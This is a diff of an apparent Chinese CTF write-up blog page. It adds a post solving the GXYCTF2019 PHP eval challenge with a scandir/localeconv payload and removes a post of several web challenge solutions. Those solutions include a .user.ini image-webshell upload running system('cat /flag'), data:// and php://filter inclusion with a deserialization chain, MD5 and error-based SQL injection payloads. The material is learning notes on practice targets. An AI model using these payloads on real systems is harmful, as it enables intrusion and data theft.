@@ -71,6 +71,78 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-57" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-57/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:44:23.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-57/">GXYCTF2019禁止套娃源码</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>这题有个git泄露   url后头加个.git 然后丢到githacker 下载下来源代码</strong></p>
+<?php
+include "flag.php";
+echo "flag在哪里呢？<br>";
+if(isset($_GET['exp'])){       ；典型的木马get方式  
+    if (!preg_match('/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i', $_GET['exp'])) {    ；这边常用伪协议均被禁止了就很离谱 
+        if(';' === preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])) {        ；这边正则匹配 ？R表示引用当前表达式  [a-z,_]+[a-z,_]+\((?R)?\)  合法表达式类似于a(b();) 
+            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {   ；过滤一些字眼
+                // echo $_GET['exp'];
+                @e、、v、、a、、l($_GET['exp']);
+            }
+            else{
+                die("还差一点哦！");
+            }
+        }
+        else{
+            die("再好好想想！");
+        }
+    }
+    else{
+        die("还想读flag，臭弟弟！");
+    }
+}
+// highlight_file(__FILE__);
+?>
+
+<p>然其不能使用php伪协议，<strong>但是@e、、v、、a、、l($_GET[‘exp’]);可以进行命令执行，所以使用scandir()函数列出当前目录中的文件和目录</strong>  ╮(╯▽╰)╭这顿号加的很无奈 不然到时候又被杀了</p>
+<ul>
+<li><strong>scandir</strong>  (语法scandir（dictionary，sorting_order,context);)    使用至少必需要有一个directory的，但是我们又没有办<strong>法去定义一个变量，这时候就要考虑php有没有什么函数是自带常量的</strong>：localeconv()  (这玩意是个数组 然后就得用到current()  这函数就自带常量  current语法current(array)</li>
+</ul>
+<p>构造一下就是array(localeconv)   </p>
+<p>在构造一下就是?exp=print_r(scandir(current(localeconv())));      然后目录爆出来</p>
+<p>这波还需要用到<strong>next函数将内部指针指向数组的下一个元素并输出.</strong></p>
+<p><strong>正常next</strong>需要用到挺多次的 然而scandir函数的返回值是一个数组，如果把<strong>数组逆序排列</strong>，再用一个<strong>next</strong>即可达成目的<br>然后就是<strong>用到array_reverse</strong>这个神奇的函数：以相反的元素按顺序返回数组<br>然后最后<strong>highlight_file 输出文件即可</strong><br>payload：?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-57/" data-id="ckroqtfm10013yww77g68dhn6" data-title="GXYCTF2019禁止套娃源码" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-56" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/08/page-56/" class="article-date">
@@ -520,62 +592,6 @@ public function isValidBlog ()
 
 
   
-    <article id="post-page-45" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/03/page-45/" class="article-date">
-  <time class="dt-published" datetime="2021-05-02T23:58:52.000Z" itemprop="datePublished">2021-05-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/03/page-45/">刷题3</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p><strong>[ACTF2020 新生赛]BackupFile 1</strong> 问你能不能找到源文件 dirsearch扫一波发现一个index.php.bak 然后打开发现  $str = “123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3”;<br>    if($key == $str) {<br>        echo $flag;  这串代码 两个等号是弱等于的意思 大概就是有几个一样的就可以echo flag 就?key=123 就可以了<br><strong>[HCTF 2018]admin 1</strong>  这关注册一个账号之后在改密码那个页面找到了这个类似于源代码的地址<br>方法一：flask session伪造 （不懂）<br>方法二：Unicode欺骗 在更改密码那边有一串源码用到strlower 就把用户名的字母转成小写  name = strlower(session[‘name’])<br>def strlower(username):<br>    username = nodeprep.prepare(username)<br>    return username<br>         这个nodeprep.prepare存在漏洞。我们还会发现，login的时候又strlower一次。这个本来是转小写的，但是如果我们注册的用户名是这个：注册用户ᴀdmin（这个是unicode字符） 登录用户ᴀdmin，变成Admin  改密码时被变成admin 巧妙<br>login的时候会经过一次strlower会编程ADMIN,在change password的时候会变成admin。因此可以更改admin的密码，从而完成登录。  那么我们改密码的时候就变成改admin的了<br>就很巧妙的解题方法<br><strong>[极客大挑战 2019]BuyFlag 1</strong>  抓包改包  buyflag那边可以找到一部分信息 抓 send to repeater  然后就添加money和password的信息<br>还有改一下cookie 能够被识别为那个什么g开头的什么的学生 user=1 就可以了  然后源码拿password后面俩== 那和上面那个差不多 就404a 这个作为password就可以<br> 或者hackbar 改cookie和postdata </p>
-<p><strong>[BJDCTF2020]Easy MD5 1</strong> 这关转回响包发现hint那边有select * from ‘admin’ where password=md5($pass,true)  百度了下这玩意是什么没看懂 <strong>反正就是有个万能密码ffifdyop</strong> 这个字符串造成的漏洞<br>本地环境试验ffifdyop，输出的开头是’or’6xxxxxx<br>在数据库语句里就构成了select * from ‘admin’ where password= ‘’or’6xxxxxx ’ 相当于 password= ‘’ or 1 变成永真式<br>输入ffifdyop  然后去到另一个页面 源码<br>$a = $GET[‘a’];<br>$b = $_GET[‘b’];</p>
-<p>if($a != $b &amp;&amp; md5($a) == md5($b))   然后可以用数组方式绕过   ?a[]=1&amp;b[]=2  又到另一个页面 然后是post  param1[]=1&amp;param2[]=2 用数组的方式可以绕过很多检测<br><strong>[SUCTF 2019]CheckIn 1 -&gt;</strong> 上传过滤为黑名单，但php脚本文件应该是无法上传的</p>
-<p>-&gt; 存在文件头过滤，需要添加图片文件的文件头</p>
-<p>-&gt; 文件的内容不能包含&lt;?，但可以上传<script language='php'><scirpt>类型的图片马来绕过<br>exif_imagetype:not image!这个回显只要添加以下文件头就可以了  GIF89a 类似这个<br> 服务器是nginx 1.10.3，似乎版本较高，不存在解析漏洞。上传不了.htaccess<br>.user.ini 可以利用这个来制作后门<br>两个有趣的设置：auto_prepend_file和auto_append_file<br>大致意思就是：我们指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：require(./a.jpg);</p>
-<p>这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）<br>上传一个这样的.user.ini：</p>
-<p>GIF89a<br>auto_prepend_file=a.jpg  让index.php 解析a.jpg<br> 然后再上传一个这样的图片马a.jpg：</p>
-<p>GIF89a</p>
-<script language='php'>system('cat /flag');</script>   另存为a.jpg
-
-<p>然后    上传后会显示uploads/后面一长串解析这串再带个index.php 就可以打开flag了</p>
-<p><strong>[ZJCTF 2019]NiZhuanSiWei 1</strong>  点进去就给了源码 需要get text file password text需要有welcome to the zjctf<br>利用data协议绕过</p>
-<p>将welcome to the zjctf写入</p>
-<p>而data://协议允许读入</p>
-<p>payload：</p>
-<p>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=<br>file=php://filter/read=convert.base64-encode/resource=useless.php （用这个来读取指定的文件 之前 <strong>[极客大挑战 2019]Secret File 1 和[ACTF2020 新生赛]Include 1 这俩有用到这个代码</strong>）然后把浏览器回显的东西base64解码一下<br>&lt;?php  </p>
-<p>class Flag{  //flag.php<br>    public $file;<br>    public function __tostring(){<br>        if(isset($this-&gt;file)){<br>            echo file_get_contents($this-&gt;file);<br>            echo “<br>“;<br>        return (“U R SO CLOSE !///COME ON PLZ”);<br>        }<br>    }<br>}<br>?&gt;    <strong>嚯哦又是反序列化</strong><br>构造&lt;?php  </p>
-<p>class Flag{  //flag.php<br>    public $file=’flag.php’;<br>    public function __tostring(){<br>        if(isset($this-&gt;file)){<br>            echo file_get_contents($this-&gt;file);<br>            echo “<br>“;<br>        return (“U R SO CLOSE !///COME ON PLZ”);<br>        }<br>    }<br>}<br>$a = new Flag(‘flag’);<br>var_dump(serialize($a));<br>?&gt;    然后丢给phpstudy 解析一下O:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}  得到这个<br>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:“Flag”:1:{s:4:“file”;s:8:“flag.php”;}  三者结合就可以得到flag了<br><strong>[极客大挑战 2019]HardSQL  1</strong>也是过滤了一堆 union 之类的 发现如and/空格/union/select/=//<strong>/等都被过滤了</strong>但是有错误回显 报错注入**<br>‘^extractvalue(1,concat(0x7e,(select(database()))))%23 （爆库名）<br>‘^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(‘geek’))))%23 （表）<br>#语句主要用()绕过了空格，用like绕过了=号<br>‘^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(‘H4rDsq1’))))%23 （列）<br>‘^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23<br>#这里要注意！select aaa from table_bbb;不需要引号！！！！！   可是只显示了flag其中的一段。 剩下的用right()显示其他位数的<br>‘^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))%23  就<strong>疯狂改数字 然后拼凑</strong></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/03/page-45/" data-id="ckroqtfls000tyww7cw9x5bvn" data-title="刷题3" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -612,6 +628,10 @@ public function isValidBlog ()
       <ul>
         
           <li>
+            <a href="/2021/07/29/page-81/">BJDCTF2020EasySearch</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/21/page-79/">MRCTF2020Ezpop</a>
           </li>
         
@@ -625,10 +645,6 @@ public function isValidBlog ()
         
           <li>
             <a href="/2021/07/16/page-76/">羊城杯 2020image_rar</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/14/page-74/">强网杯2021 threebody</a>
           </li>
         
       </ul>
